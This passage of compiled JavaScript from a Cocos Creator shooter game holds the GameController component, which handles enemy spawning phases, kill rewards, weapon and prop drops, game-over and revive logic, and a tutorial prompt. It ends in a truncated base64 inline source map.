            /** 0.5s出一个怪物 */
            var action = cc.sequence(cc.repeat(cc.sequence(cc.callFunc(function () { return _this._genEnemyCount += 1; }), cc.delayTime(0.5)), GameProxy_1.GameProxy.levelConfig.delimit_p1), cc.callFunc(function () {
                _this._generating = false;
                _this.startCDTask();
            }));
            action.setTag(1010);
            this.node.runAction(action);
        }
        else {
            /** 第二阶段 0.5s一次出3个 */
            /** 0.5s出一个怪物 */
            var action = cc.sequence(cc.repeat(cc.sequence(cc.callFunc(function () { return _this._genEnemyCount += 1; }), cc.delayTime(0.5)), Math.floor(GameProxy_1.GameProxy.levelConfig.delimit_p1)), cc.callFunc(function () {
                _this._generating = false;
                _this.startCDTask();
            }));
            action.setTag(1010);
            this.node.runAction(action);
        }
    };
    /**
     * 停止怪物生成计划
     * */
    GameController.prototype.stopGenerating = function () {
        if (!this._generating)
            return;
        this.node.stopActionByTag(1010);
    };
    /** 计时任务 */
    GameController.prototype.startCDTask = function () {
        var _this = this;
        this.stopCDTask();
        var action = cc.sequence(cc.delayTime(10), cc.callFunc(function () {
            /** 生成两只怪物 */
            _this._genEnemyCount += 2;
            _this.startCDTask();
        }));
        action.setTag(1041);
        this.node.runAction(action);
    };
    /** 停止计时任务 */
    GameController.prototype.stopCDTask = function () {
        this.node.stopActionByTag(1041);
    };
    GameController.prototype.onKillRole = function () {
        GameProxy_1.GameProxy.isOver = true;
        GameProxy_1.GameProxy.pauseGame = true;
        if (GameProxy_1.GameProxy.firstAidFlag) {
            this.reliveNode.active = true;
        }
        else {
            this.reliveNode.active = true;
        }
        Music_1.Music.playSFX("sound/msc_rol002");
        console.log("game over==>等待复活");
    };
    /** 掉枪 */
    GameController.prototype.displayGun = function (position) {
        var _this = this;
        var prop = window['GameEnemysController'].getInactiveGun();
        var testList = this._gunsList.filter(function (value) { return !_this._displayGusList.includes(value); });
        if (testList.length == 0) {
            testList = this._gunsList;
            this._displayGusList = [];
        }
        var id = Extend_1.ext.randomElement(testList);
        this._displayGusList.push(id);
        prop.init(id + 100);
        prop.node.position = position;
        prop.display();
    };
    /** 掉道具 */
    GameController.prototype.displayProp = function (position) {
        var _this = this;
        var testList = this._propList.filter(function (value) { return !_this._displayPropList.includes(value); });
        if (testList.length == 0) {
            testList = this._propList;
            this._displayPropList = [];
        }
        var id = Extend_1.ext.randomElement(testList);
        this._displayPropList.push(id);
        var prop = window['GameEnemysController'].getInactiveProp(id);
        prop.node.position = position;
        prop.display();
    };
    GameController.prototype.onKillEnemy = function (enemy) {
        if (GameProxy_1.GameProxy.killCount % 10 == 0) {
            var position = enemy.node.position;
            if (this._preDisplayGun) {
                this.displayProp(position);
            }
            else {
                this.displayGun(position);
            }
            this._preDisplayGun = !this._preDisplayGun;
        }
        if (GameProxy_1.GameProxy.killCount == GameProxy_1.GameProxy.levelConfig.amount_p1 - 3) {
            this.displayGun(enemy.node.position);
        }
        if (GameProxy_1.GameProxy.killCount + window['GameEnemysController'].allAliveEnemy().length < GameProxy_1.GameProxy.levelConfig.amount_p1) {
            //第一阶段
            this._genEnemyCount += 2;
            this.startCDTask();
        }
        else if (GameProxy_1.GameProxy.enemyList.length > 0) {
            //第二阶段
            this._genEnemyCount += 3;
            this.startCDTask();
        }
        else if (GameProxy_1.GameProxy.killCount >= GameProxy_1.GameProxy.maxEnemyNum) {
            GameProxy_1.GameProxy.isOver = true;
            GameProxy_1.GameProxy.pauseGame = true;
            console.log("game win.");
            this.blockNode.active = true;
        }
        if (GameProxy_1.GameProxy.killCount == 5) {
            if (!World_1.World.My.newbies.state("KillFiveEnemy")) {
                var newbieNode = new cc.Node();
                newbieNode.name = "newbieNode";
                newbieNode.position = this.supplyGuideNode.convertToWorldSpaceAR(cc.v2());
                cc.director.getScene().addChild(newbieNode);
                /** guideCircle */
                var guideCirclePrefab = cc.loader.getRes("prefab/guideCircle");
                var guideCircleNode = cc.instantiate(guideCirclePrefab);
                guideCircleNode.position = cc.v2();
                newbieNode.addChild(guideCircleNode);
                /** guideSke */
                var guideSkePrefab = cc.loader.getRes("prefab/guideSke");
                var guideSkeNode = cc.instantiate(guideSkePrefab);
                guideSkeNode.position = cc.v2();
                newbieNode.addChild(guideSkeNode);
                GameProxy_1.GameProxy.pauseGame = true;
                this.greyNode.stopAllActions();
                this.greyNode.opacity = 0;
            }
        }
    };
    GameController.prototype.genEnemy = function () {
        if (GameProxy_1.GameProxy.enemyList.length <= 0) {
            return;
        }
        /** 判断上限 */
        /** 第一阶段 */
        var aliveCount = window['GameEnemysController'].allAliveEnemy().length;
        if (GameProxy_1.GameProxy.killCount + aliveCount <= GameProxy_1.GameProxy.levelConfig.amount_p1) {
            if (aliveCount >= GameProxy_1.GameProxy.levelConfig.limit_p1) {
                return;
            }
        }
        else {
            if (aliveCount >= GameProxy_1.GameProxy.levelConfig.limit_p2) {
                return;
            }
        }
        window['GameEnemysController'].createEnemy(GameProxy_1.GameProxy.enemyList.shift());
        this._genEnemyCount--;
        // window['GameEnemysController'].createEnemy(3);
        if (GameProxy_1.GameProxy.maxEnemyNum - GameProxy_1.GameProxy.enemyList.length === GameProxy_1.GameProxy.levelConfig.amount_p1 + 1) {
            this.moreEnemyTipsAnimation.node.opacity = 255;
            this.moreEnemyTipsAnimation.node.active = true;
            this.moreEnemyTipsAnimation.play();
        }
        if (GameProxy_1.GameProxy.enemyList.length == GameProxy_1.GameProxy.secondBossNum - 1) {
            this.bossTipsAnimation.node.opacity = 255;
            this.bossTipsAnimation.node.active = true;
            this.bossTipsAnimation.play();
        }
    };
    GameController.prototype.update = function (dt) {
        if (this._genEnemyCount > 0) {
            this.genEnemy();
        }
    };
    __decorate([
        property(cc.Animation)
    ], GameController.prototype, "moreEnemyTipsAnimation", void 0);
    __decorate([
        property(cc.Animation)
    ], GameController.prototype, "bossTipsAnimation", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "supplyGuideNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "shakeNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "topNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "leftNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "rightNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "supplyNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "greyNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "blockNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "reliveNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameController.prototype, "gameOverNode", void 0);
    GameController = __decorate([
        ccclass
    ], GameController);
    return GameController;
}(cc.Component));
exports.default = GameController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZUNvbnRyb2xsZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUNBLHlDQUFzQztBQUV0QywyREFBcUQ7QUFDckQsdUNBQW9DO0FBQ3BDLHlEQUFzRDtBQUN0RCxxRUFBa0U7QUFDbEUsNkRBQTBEO0FBQzFELHdEQUFxRDtBQUUvQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUE0QyxrQ0FBWTtJQUF4RDtRQUFBLHFFQXNWQztRQXBWRyw0QkFBc0IsR0FBZ0IsSUFBSSxDQUFDO1FBRzNDLHVCQUFpQixHQUFnQixJQUFJLENBQUM7UUFHdEMscUJBQWUsR0FBVyxJQUFJLENBQUM7UUFHL0IsZUFBUyxHQUFXLElBQUksQ0FBQztRQUd6QixhQUFPLEdBQVcsSUFBSSxDQUFDO1FBR3ZCLGNBQVEsR0FBVyxJQUFJLENBQUM7UUFHeEIsZUFBUyxHQUFXLElBQUksQ0FBQztRQUd6QixnQkFBVSxHQUFXLElBQUksQ0FBQztRQUcxQixjQUFRLEdBQVcsSUFBSSxDQUFDO1FBR3hCLGVBQVMsR0FBVyxJQUFJLENBQUM7UUFHekIsZ0JBQVUsR0FBVyxJQUFJLENBQUM7UUFHMUIsa0JBQVksR0FBVyxJQUFJLENBQUM7UUFHcEIsaUJBQVcsR0FBRyxLQUFLLENBQUM7UUFFcEIsb0JBQWMsR0FBRyxDQUFDLENBQUM7UUEyR25CLG9CQUFjLEdBQUcsQ0FBQyxDQUFDO1FBb0VuQixlQUFTLEdBQUcsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsRUFBRSxFQUFFLEVBQUUsRUFBRSxFQUFFLENBQUMsQ0FBQztRQUM5QyxlQUFTLEdBQUcsRUFBRSxDQUFDO1FBRWYsc0JBQWdCLEdBQUcsRUFBRSxDQUFDO1FBQ3RCLHFCQUFlLEdBQUcsRUFBRSxDQUFDO1FBK0JyQixvQkFBYyxHQUFHLEtBQUssQ0FBQzs7SUE0Rm5DLENBQUM7SUE1U0csc0NBQWEsR0FBYixVQUFjLEtBQUssRUFBQyxJQUFJO1FBQ3BCLE9BQU8sQ0FBQyxHQUFHLENBQUMsOEJBQThCLENBQUMsQ0FBQTtRQUUzQyxJQUFJLENBQUMsVUFBVSxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDOUIsSUFBSSxVQUFVLEdBQUcsRUFBRSxDQUFDLFFBQVEsQ0FBQyxRQUFRLEVBQUUsQ0FBQyxjQUFjLENBQUMsWUFBWSxDQUFDLENBQUM7UUFDckUsSUFBSSxVQUFVLEVBQUM7WUFDWCxVQUFVLENBQUMsT0FBTyxFQUFFLENBQUM7WUFDckIsYUFBSyxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsTUFBTSxDQUFDLGVBQWUsQ0FBQyxDQUFDO1NBQzVDO0lBQ0wsQ0FBQztJQUVELGtDQUFTLEdBQVQ7UUFBQSxpQkFvQkM7UUFuQkcsSUFBSSxRQUFRLEdBQUcsRUFBRSxDQUFDO1FBQ2xCLElBQUksQ0FBQyxPQUFPLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMzQixJQUFJLENBQUMsT0FBTyxDQUFDLENBQUMsR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLE1BQU0sR0FBQyxDQUFDLEdBQUcsR0FBRyxDQUFDO1FBQ3pELElBQUksS0FBSyxHQUFHLEdBQUcsQ0FBQztRQUNoQixJQUFJLFFBQVEsR0FBRyxJQUFJLENBQUMsT0FBTyxDQUFDLENBQUMsR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDLE1BQU0sR0FBQyxDQUFDLENBQUM7UUFDbEUsSUFBSSxZQUFHLENBQUMsU0FBUyxFQUFDO1lBQ2QsUUFBUSxJQUFJLEVBQUUsQ0FBQztTQUNsQjtRQUNELFFBQVEsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxjQUFjLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxRQUFRLEdBQUMsS0FBSyxFQUFFLEVBQUUsQ0FBQyxFQUFFLENBQUMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDM0YsSUFBSSxDQUFDLFFBQVEsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzVCLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxLQUFLLEdBQUMsQ0FBQyxHQUFDLEdBQUcsQ0FBQztRQUN4RCxRQUFRLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsY0FBYyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsS0FBSyxHQUFDLENBQUMsR0FBRyxJQUFJLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxHQUFDLEtBQUssRUFBRSxFQUFFLENBQUMsRUFBRSxDQUFDLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxLQUFLLEdBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDdkwsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzdCLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQyxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsS0FBSyxHQUFDLENBQUMsR0FBQyxHQUFHLENBQUM7UUFDeEQsUUFBUSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLGNBQWMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxLQUFLLEdBQUMsQ0FBQyxHQUFHLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLEdBQUMsS0FBSyxFQUFFLEVBQUUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxLQUFLLEdBQUMsQ0FBQyxFQUFFLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUE7UUFDdkwsT0FBTyxDQUFDLEdBQUcsQ0FBQyxRQUFRLENBQUMsQ0FBQyxJQUFJLENBQUMsVUFBQSxHQUFHO1lBQzFCLHFCQUFTLENBQUMsSUFBSSxDQUFDLHFCQUFTLENBQUMsS0FBSyxDQUFDLFNBQVMsQ0FBQyxDQUFDO1lBQzFDLEtBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNsQyxDQUFDLENBQUMsQ0FBQztJQUNQLENBQUM7SUFFRCwrQkFBTSxHQUFOO1FBQ0ksSUFBSSxDQUFDLFVBQVUsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQy9CLElBQUksQ0FBQyxRQUFRLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUM1QixJQUFJLENBQUMsUUFBUSxDQUFDLE9BQU8sR0FBRyxDQUFDLENBQUM7UUFDMUIsSUFBSSxDQUFDLFVBQVUsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQy9CLElBQUksQ0FBQyxZQUFZLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNqQyxJQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDNUIsSUFBSSxDQUFDLFFBQVEsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQzdCLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUM5QixJQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUM7UUFDN0IsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsYUFBYSxFQUFFLElBQUksQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDeEUsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsWUFBWSxFQUFFLElBQUksQ0FBQyxjQUFjLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDdEUsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsU0FBUyxFQUFFLElBQUksQ0FBQyxXQUFXLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDaEUsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsUUFBUSxFQUFFLElBQUksQ0FBQyxVQUFVLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDOUQsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsUUFBUSxFQUFFLElBQUksQ0FBQyxVQUFVLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDOUQsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsU0FBUyxFQUFFLElBQUksQ0FBQyxXQUFXLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDaEUsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsV0FBVyxFQUFFLElBQUksQ0FBQyxhQUFhLEVBQUUsSUFBSSxDQUFDLENBQUM7UUFDcEUscUJBQVMsQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQztRQUNoQyxJQUFJLENBQUMsU0FBUyxFQUFFLENBQUM7SUFDckIsQ0FBQztJQUVELDhCQUFLLEdBQUw7UUFDSSxxQkFBUyxDQUFDLEtBQUssR0FBRyxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsQ0FBQztRQUMxQyxxQkFBUyxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUM7UUFDM0IscUJBQVMsQ0FBQyxTQUFTLEdBQUcsS0FBSyxDQUFDO1FBQzVCLElBQUksQ0FBQyxjQUFjLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFHLEdBQUcsR0FBRyxFQUFFLENBQUM7UUFDL0MscUJBQVMsQ0FBQyxJQUFJLENBQUMscUJBQVMsQ0FBQyxLQUFLLENB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